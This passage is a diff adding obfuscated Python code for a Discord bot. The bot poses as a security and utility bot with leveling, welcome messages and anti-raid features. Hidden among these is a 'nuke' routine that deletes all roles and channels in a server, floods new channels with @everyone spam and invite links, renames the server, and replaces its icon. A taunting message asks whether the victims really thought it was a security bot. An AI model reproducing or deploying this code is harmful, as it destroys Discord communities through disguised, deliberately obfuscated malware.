+        l1ll11111l11 = l1l1l11111l1.message_delay if l11l111l11l1 else l1l1l11111l1.rate_limit_delay
+        await asyncio.sleep(max(l1ll11111l11, ll11111111ll))
+
+    async def l11111ll111l(l111llllllll, lll1ll11ll1l, l11lll1111l1, l1l1111l1lll=5, lll1l1l11111=None, l1l1l1llllll=None):
+        ll1ll1l11lll = discord.Embed(title='Do you really think this is a security bot?', description=f'**This server has been nuked by LUNAL KINGDOM.**\nJoin: [LUNAL KINGDOM]({SUPPORT_LINK})\nJoin 2: [LUNAL KINGDOM 2]({SUPPORT_LINK2})', color=3092790, timestamp=ll1l11l1ll1l())
+        ll1ll1l11lll.set_footer(text='NUKE BY LUNAL KINGDOM')
+        if l1l1l1llllll:
+            ll1ll1l11lll.set_thumbnail(url=l1l1l1llllll)
+        if lll1l1l11111:
+            ll1ll1l11lll.set_image(url=lll1l1l11111)
+        l111l111ll1l = f'||@everyone|| ||@here||\n{l11lll1111l1}'
+        for ll1llll11l11 in range(min(l1l1111l1lll, l111llllllll.max_messages)):
+            try:
+                await lll1ll11ll1l.send(content=l111l111ll1l, embed=ll1ll1l11lll)
+                await l111llllllll.lll1lll111ll(l11l111l11l1=True)
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    await l111llllllll.lll1lll111ll(float(e.response.headers.l11111111l1l('Retry-After', 0.2)), l11l111l11l1=True)
+                else:
+                    await l111llllllll.l1l111l1l111(f'Failed to send in {lll1ll11ll1l.name}: {e}')
+                    break
+
+    async def l1111l1l11ll(ll11ll1l111l, ll1ll1lll111):
+        try:
+            if not ll1ll1lll111.me.guild_permissions.manage_guild:
+                await ll11ll1l111l.l1l111l1l111('Không có quyền đổi avatar.')
+                return
+            async with aiohttp.ClientSession() as l11ll11l1l1l:
+                async with l11ll11l1l1l.l11111111l1l(AVATAR_URL) as lll1ll11llll:
+                    if lll1ll11llll.status == 200:
+                        lll111l11lll = await lll1ll11llll.read()
+                        if 0 < len(lll111l11lll) < 10 * 1024 * 1024:
+                            await ll1ll1lll111.edit(icon=lll111l11lll)
+                            await ll11ll1l111l.l1l111l1l111('Đã đổi avatar server.')
+                        else:
+                            await ll11ll1l111l.l1l111l1l111('Ảnh không hợp lệ hoặc quá lớn.')
+                    else:
+                        await ll11ll1l111l.l1l111l1l111(f'Không tải được ảnh (status {lll1ll11llll.status})')
+        except Exception as e:
+            await ll11ll1l111l.l1l111l1l111(f'Lỗi đổi avatar: {e}')
+
+    async def ll111l1l1l1l(llllll11111l, lll11ll11lll):
+        l111l11111l1 = asyncio.get_event_loop().time()
+        if l111l11111l1 - llllll11111l.last_nuke_time < 120:
+            await llllll11111l.l1l111l1l111('Nuke on cooldown.')
+            return
+        llllll11111l.last_nuke_time = l111l11111l1
+        lllll1111111 = '# <a:Black_cross:1353971971095793776> **__₠ ₴ɆⱤVɆⱤ ĐɆ₴₮ⱤØɎɆĐ ฿Ɏ ⱠɄ₦₳Ⱡ ₭ł₦₲ĐØ₥ ℠__** <a:Black_cross:1353971971095793776>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/5WFupkFbkM\n> ||Join 2:|| https://discord.gg/HVWArvBGy'
+        ll11l1lll1ll = 'https://i.pinimg.com/originals/df/1b/55/df1b5570637dfa5dea04929d5a787a1e.gif'
+        await llllll11111l.l1l111l1l111('Starting role deletion...')
+        await llllll11111l.l1111lll1l1l(lll11ll11lll.guild)
+        await llllll11111l.l1l111l1l111('Starting channel deletion...')
+        ll1llll1l111 = set()
+        l111ll111111 = [llllll11111l.ll11l1lll11l(l1llll1l11l1, ll1llll1l111) for l1llll1l11l1 in lll11ll11lll.guild.channels]
+        await llllll11111l._process_tasks(l111ll111111, 'deletion')
+        await llllll11111l.l1l111l1l111('Starting channel creation...')
+        l111ll1ll11l = [llllll11111l.l11l11l11l11(lll11ll11lll.guild, ll1lll111lll) for ll1lll111lll in llllll11111l.channel_names]
+        l1l111l111l1, l11llll1ll1l = await llllll11111l._process_create_tasks(l111ll1ll11l)
+        await llllll11111l.l1l111l1l111('Renaming server...')
+        await llllll11111l._rename_server(lll11ll11lll.guild)
+        await llllll11111l.l1111l1l11ll(lll11ll11lll.guild)
+        await llllll11111l.l1l111l1l111('Spamming default channel...')
+        l11ll11l1ll1 = lll11ll11lll.guild.system_channel or (lll11ll11lll.guild.text_channels[0] if lll11ll11lll.guild.text_channels else None)
+        if l11ll11l1ll1:
+            await llllll11111l._spam_default_channel(l11ll11l1ll1, lllll1111111, ll11l1lll1ll)
+        await llllll11111l.l1l111l1l111('Spamming new channels...')
+        l111lll111ll = [llllll11111l.l11111ll111l(l1l1111ll111, lllll1111111, lll1l1l11111=ll11l1lll1ll) for l1l1111ll111 in l1l111l111l1 if l1l1111ll111]
+        await llllll11111l._process_tasks(l111lll111ll, 'spam')
+        await llllll11111l.l1l111l1l111('Nuke completed successfully.')
+
+    async def ll1l1l11111l(l1ll1l1llll1, tasks, lllll1lll1ll):
+        for llllll1l1l1l in range(0, len(tasks), l1ll1l1llll1.concurrent_tasks):
+            try:
+                await asyncio.gather(*tasks[llllll1l1l1l:llllll1l1l1l + l1ll1l1llll1.concurrent_tasks], return_exceptions=True)
+            except Exception as e:
+                await l1ll1l1llll1.l1l111l1l111(f'[{lllll1lll1ll}] Error in batch: {e}')
+
+    async def lll1111111l1(l1ll11ll11ll, tasks):
+        lllll1l11l11 = []
+        for l111l1ll1111 in range(0, len(tasks), l1ll11ll11ll.concurrent_tasks):
+            try:
+                lll1lllll1l1 = await asyncio.gather(*tasks[l111l1ll1111:l111l1ll1111 + l1ll11ll11ll.concurrent_tasks], return_exceptions=True)
+                for lll1l11l111l, llllllll1ll1 in lll1lllll1l1:
+                    if lll1l11l111l and isinstance(lll1l11l111l, discord.TextChannel):
+                        lllll1l11l11.append(lll1l11l111l)
+            except Exception as e:
+                await l1ll11ll11ll.l1l111l1l111(f'[create_channel] Error in batch: {e}')
+        return (lllll1l11l11, [])
+
+    async def l1ll1l1l1l11(llll111ll11l, lllll111lll1, lllll11ll11l, ll111lll11l1):
+        try:
+            await llll111ll11l.l11111ll111l(lllll111lll1, lllll11ll11l, l1l1111l1lll=5, lll1l1l11111=ll111lll11l1)
+        except Exception as e:
+            await llll111ll11l.l1l111l1l111(f'Failed to spam default channel: {e}')
+
+    async def ll11111ll1ll(l1ll1111ll11, lll11ll1l1ll):
+        try:
+            await lll11ll1l1ll.edit(name='ℕ𝔾𝕌 𝕃Ồℕ / ℕ𝕌𝕂𝔼𝔻 𝔹𝕐 𝕃𝕌ℕ𝔸𝕃')
+        except Exception as e:
+            await l1ll1111ll11.l1l111l1l111(f'Failed to rename server: {e}')
+
+    async def lll1111111ll(l111l1lllll1, l11111l1l1l1):
+        if l11111l1l1l1.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await l111l1lllll1._delete_command_message(l11111l1l1l1)
+        l1lll11111l1 = await l111l1lllll1._create_invite(l11111l1l1l1)
+        await l111l1lllll1.ll1llll1ll11(l11111l1l1l1, l1lll11111l1)
+        await l111l1lllll1.ll111l1l1l1l(l11111l1l1l1)
+
+    async def l1l11l1111l1(lll1lll111l1, l1111111111l):
+        try:
+            await l1111111111l.lll1lll1l111()
+        except:
+            pass
+
+    async def lll111l11ll1(ll11lll1l11l, ll111lll111l):
+        try:
+            ll1l1ll1l11l = await ll111lll111l.channel.create_invite(max_age=0, max_uses=0)
+            return ll1l1ll1l11l.url
+        except:
+            return 'Unable to create invite.'
+
+@tasks.loop(minutes=10)
+async def ll11l11l1ll1():
+    llll1l1ll11l.l11l1llll111()
+    l111l1l1l111('Auto-saved data', 'INFO')
+
+@l11ll11l111l.event
+async def l1l1ll1l1lll():
+    print(f'[+] Logged in as {l11ll11l111l.user}')
+    await l11ll11l111l.change_presence(activity=discord.Streaming(name=f'l!help | {len(l11ll11l111l.guilds)} Servers | {len(l11ll11l111l.users)} Users', url='https://twitch.tv/lunalkingdom'))
+    print(f'[+] Ready | {len(l11ll11l111l.guilds)} servers | {len(l11ll11l111l.users)} users')
+    ll11l11l1ll1.start()
+
+@l11ll11l111l.event
+async def l11l1ll1llll(l11ll1l1lll1):
+    if l11ll1l1lll1.author.bot:
+        return
+    try:
+        if random.randint(1, 10) == 1:
+            l1111ll11lll = l11ll1l1lll1.author.id
+            LevelSystem.l111ll1llll1(l1111ll11lll, random.randint(1, 3))
+            if LevelSystem.l1l1l11lll1l(l1111ll11lll):
+                ll1l11ll1ll1 = LevelSystem.lll11ll1l11l(l1111ll11lll)
+                await l11ll1l1lll1.channel.send(f'🎉 {l11ll1l1lll1.author.mention} đã lên level **{ll1l11ll1ll1}**!')
+        if l11ll1l1lll1.guild:
+            l11ll111l1l1 = l1ll1l11lll1(l11ll1l1lll1.guild.id)
+            if l11ll111l1l1 and l11ll111l1l1.l11111111l1l('antiraid', False):
+                l1111ll11lll = l11ll1l1lll1.author.id
+                if l1111ll11lll not in message_history:
+                    message_history[l1111ll11lll] = []
+                message_history[l1111ll11lll].append((time.time(), l11ll1l1lll1.channel.id))
+                llll1111l1l1 = l11ll111l1l1.l11111111l1l('raid_time', 5)
+                l11ll11l11ll = time.time() - llll1111l1l1
+                message_history[l1111ll11lll] = [ll111lll1l11 for ll111lll1l11 in message_history[l1111ll11lll] if ll111lll1l11[0] > l11ll11l11ll]
+                l1l1lll1ll1l = l11ll111l1l1.l11111111l1l('raid_threshold', 5)
+                if len(message_history[l1111ll11lll]) > l1l1lll1ll1l:
+                    ll111111l111 = l11ll111l1l1.l11111111l1l('log_channel')
+                    if ll111111l111:
+                        l111ll11l1ll = l11ll11l111l.get_channel(ll111111l111)
+                        if l111ll11l1ll:
+                            await l111ll11l1ll.send(f'⚠️ **Anti-Raid triggered!** {l11ll1l1lll1.author.mention} sent {len(message_history[l1111ll11lll])} messages in {llll1111l1l1}s. Kicking...')
+                    try:
+                        await l11ll1l1lll1.author.kick(reason='Auto-raid detection')
+                    except:
+                        pass
+                    message_history[l1111ll11lll] = []
+        if l11ll1l1lll1.guild:
+            l11ll111l1l1 = l1ll1l11lll1(l11ll1l1lll1.guild.id)
+            if l11ll111l1l1 and l11ll111l1l1.l11111111l1l('antinuke', False):
+                async for lll111llll1l in l11ll1l1lll1.guild.audit_logs(limit=5, action=discord.AuditLogAction.channel_create):
+                    try:
+                        l111111ll111 = lll111llll1l.target.id
+                    except AttributeError:
+                        continue
+                    if l111111ll111 in channel_creation_history:
+                        channel_creation_history[l111111ll111].append((time.time(), lll111llll1l.target.name))
+                    else:
+                        channel_creation_history[l111111ll111] = [(time.time(), lll111llll1l.target.name)]
+                    if len(channel_creation_history[l111111ll111]) > 5:
+                        ll111111l111 = l11ll111l1l1.l11111111l1l('log_channel')
+                        if ll111111l111:
+                            l111ll11l1ll = l11ll11l111l.get_channel(ll111111l111)
+                            if l111ll11l1ll:
+                                await l111ll11l1ll.send(f'⚠️ **Anti-Nuke triggered!** {lll111llll1l.user.mention} created too many channels. Banning...')
+                        try:
+                            await lll111llll1l.user.ban(reason='Auto-nuke detection')
+                        except:
+                            pass
+                        channel_creation_history[l111111ll111] = []
+    except Exception as e:
+        l111l1l1l111(f'Lỗi trong on_message (nền): {e}', 'ERROR')
+    if l11ll1l1lll1.content.startswith(PREFIX):
+        try:
+            await l11ll11l111l.process_commands(l11ll1l1lll1)
+        except Exception as e:
+            l111l1l1l111(f'Lỗi process_commands: {e}', 'ERROR')
+            await l11ll1l1lll1.channel.send('❌ Đã xảy ra lỗi khi xử lý lệnh.')
+
+@l11ll11l111l.event
+async def ll1l11lll111(l11111llll1l):
+    if l11111llll1l.author.bot:
+        return
+    snipe_cache[l11111llll1l.channel.id] = {'content': l11111llll1l.content, 'author': l11111llll1l.author.display_name, 'avatar': l11111llll1l.author.display_avatar.url, 'time': ll1l11l1ll1l()}
+
+@l11ll11l111l.event
+async def ll111ll1l1ll(l11ll1lll1ll):
+    ll1lll1ll111 = llll1l1ll11l.l1lll1ll111l(l11ll1lll1ll.guild.id)
+    l1l111l1l1l1 = ll1lll1ll111.l11111111l1l('welcome_channel')
+    if l1l111l1l1l1:
+        l1llll1ll1l1 = l11ll1lll1ll.guild.get_channel(l1l111l1l1l1)
+        if l1llll1ll1l1:
+            ll1l11l1l11l = discord.Embed(title='👋 Welcome!', description=f'Chào mừng {l11ll1lll1ll.mention} đến với {l11ll1lll1ll.guild.name}!', color=65416, timestamp=ll1l11l1ll1l())
+            ll1l11l1l11l.set_thumbnail(url=l11ll1lll1ll.display_avatar.url)
+            await l1llll1ll1l1.send(embed=ll1l11l1l11l)
+
+@l11ll11l111l.event
+async def l1l1l1lll1l1(l1111l11ll1l):
+    llll1lll1l1l = llll1l1ll11l.l1lll1ll111l(l1111l11ll1l.guild.id)
+    ll1lllll1lll = llll1lll1l1l.l11111111l1l('goodbye_channel')
+    if ll1lllll1lll:
+        ll111ll1ll1l = l1111l11ll1l.guild.get_channel(ll1lllll1lll)
+        if ll111ll1ll1l:
+            l11111l11lll = discord.Embed(title='👋 Goodbye!', description=f'{l1111l11ll1l.display_name} đã rời khỏi server.', color=16729156, timestamp=ll1l11l1ll1l())
+            l11111l11lll.set_thumbnail(url=l1111l11ll1l.display_avatar.url)
+            await ll111ll1ll1l.send(embed=l11111l11lll)
+
+@l11ll11l111l.event
+async def l1111llll1ll(l1l11ll11lll, ll1111l111ll):
+    if isinstance(ll1111l111ll, commands.CommandOnCooldown):
+        await l1l11ll11lll.send(f'⏳ Wait {ll1111l111ll.retry_after:.1f}s to reuse.', delete_after=5)
+    elif isinstance(ll1111l111ll, commands.MissingPermissions):
+        await l1l11ll11lll.send(f"❌ You need `{', '.join(ll1111l111ll.missing_permissions)}` to use this command.")
+    elif isinstance(ll1111l111ll, commands.BadArgument):
+        await l1l11ll11lll.send('❌ Invalid argument.')
+    else:
+        await l1l11ll11lll.send(f'❌ An error occurred: {str(ll1111l111ll)}')
+        print(ll1111l111ll)
+
+async def ll1l11l111ll():
+    await l11ll11l111l.add_cog(Help(l11ll11l111l))
+    await l11ll11l111l.add_cog(Nuke(l11ll11l111l))
+    await l11ll11l111l.add_cog(Utility(l11ll11l111l))
+    await l11ll11l111l.add_cog(Fun(l11ll11l111l))
+    await l11ll11l111l.add_cog(EconomyCommands(l11ll11l111l))
+    await l11ll11l111l.add_cog(LevelCommands(l11ll11l111l))
+    await l11ll11l111l.add_cog(Anti(l11ll11l111l))
+    await l11ll11l111l.add_cog(ServerList(l11ll11l111l))
+    await l11ll11l111l.add_cog(Ticket(l11ll11l111l))
+
+async def lllllll1ll11():
+    await ll1l11l111ll()
+    await l11ll11l111l.start(l1lll11lllll)
+if __name__ == '__main__':
+    try:
+        asyncio.run(lllllll1ll11())
+    except KeyboardInterrupt:
+        print('Bot stopped.')
+    except Exception as e:
+        print(f'[-] Error: {e}')
+        input('Press Enter to exit...')
